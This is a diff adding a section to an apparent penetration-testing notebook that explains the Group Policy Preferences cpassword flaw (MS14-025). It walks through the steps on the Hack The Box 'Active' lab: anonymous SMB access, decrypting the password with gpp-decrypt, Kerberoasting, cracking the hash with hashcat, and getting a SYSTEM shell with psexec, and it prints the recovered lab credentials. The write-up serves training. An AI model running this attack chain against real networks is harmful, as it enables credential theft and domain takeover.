@@ -394,4 +394,89 @@ Strategies:
 
 <mark style="color:yellow;">Do NOT ever make your service accounts Domain Administrators or of a high privilege.</mark>
 
-## Group Policy Preferences (GPP Attack)
+## Group Policy Preferences (GPP Attack)&#x20;
+
+This is also known as <mark style="color:yellow;">MS14-025</mark>
+
+* Admins created policies using embedded credentials
+* These credentials were encrypted and placed in "cpassword"
+* The key was accidentally leaked by Microsoft
+* This was patched in MS14-025, but does not prevent previous uses
+
+This means that we can DECRYPT THIS PASSWORD AT ANYTIME.
+
+## Abusing GPP
+
+* This attack is going to take place on Hack The Box's "Active" box
+* From the nmap scan, we are able to quickly identify that this is more than likely a Domain Controller because we see things such as:
+  * 53
+  * 88
+  * LDAP
+  * LDAPSSL
+
+### Exploitation
+
+We attempt anonymous login via SMB:
+
+```
+smbclient -L \\\\10.10.10.100\\
+Enter password:
+Anonymous login successful
+
+Sharename
+Replication    Disk
+
+smbclient \\\\10.10.10.100\\Replication
+Enter password:
+Anonymous login successful
+smb: \> prompt off
+smb: \> recurse on
+smb: \> mget *
+
+Groups.xml file
+```
+
+* We instantly notice <mark style="color:yellow;">Groups.xml</mark> when targetting GPP
+* When opening this file, we can see our <mark style="color:yellow;">cpassword</mark>!
+* We also identify the user that this password belongs to in the file!&#x20;
+  * svc\_tgs
+
+### gpp-decrypt
+
+Copy the cpassword and open a new tab in terminal:
+
+```
+gpp-decrypt <place_cpassword_here>
+GPPstillStandingStrong2k18
+```
+
+### Privilege Escalation after GPP Attack
+
+Kerberoasting:
+
+```
+impacket-GetUserSPNs active.htb/svc_tgs:GPPstillStandingStrong2k18 -dc-ip 10.10.10.100 -request
+
+<krb5tgs_hash_here>
+```
+
+* We have a service ticket!!
+
+Time to crack the hash:
+
+* Place the ENTIRE hash into the hashes.txt file
+
+```
+hashcat64.exe -m 13100 hashes.txt rockyou.txt -O
+
+Ticketmaster1968@10.10.10.100
+```
+
+Authentication:
+
+```
+impacket-psexec active.htb/Administrator:Ticketmaster1968@10.10.10.100
+
+C:\Windows\system32>whoami
+nt authority\system
+```
